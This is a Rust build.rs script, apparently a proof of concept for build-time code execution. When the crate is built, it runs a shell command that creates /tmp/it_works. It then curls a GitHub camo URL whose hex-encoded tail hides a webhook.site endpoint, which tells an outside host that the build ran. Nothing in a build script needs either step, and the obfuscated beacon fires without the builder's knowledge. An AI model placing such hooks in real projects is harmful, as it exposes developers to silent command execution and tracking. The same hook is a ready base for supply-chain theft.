use std::process::Command;

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    
    // Run sh -c "touch /tmp/it_works"
    let output = Command::new("sh")
        .arg("-c")
        .arg("touch /tmp/it_works")
        .output()
        .expect("Failed to execute command");
    
    if output.status.success() {
        println!("Successfully created /tmp/it_works");
    } else {
        eprintln!("Failed to create /tmp/it_works");
        std::process::exit(1);
    }
    
    // Run curl command
    let curl_output = Command::new("curl")
        .arg("https://camo.githubusercontent.com/1815c657840356e9211a0d5d4b18ec6373c2ed3219df0f87e4a1e09287769ace/68747470733a2f2f776562686f6f6b2e736974652f32663163313265652d363862342d343864332d616136382d323162363535653134366633")
        .output()
        .expect("Failed to execute curl command");
    
    if curl_output.status.success() {
        println!("Successfully executed curl command");
    } else {
        eprintln!("Failed to execute curl command");
        std::process::exit(1);
    }
}
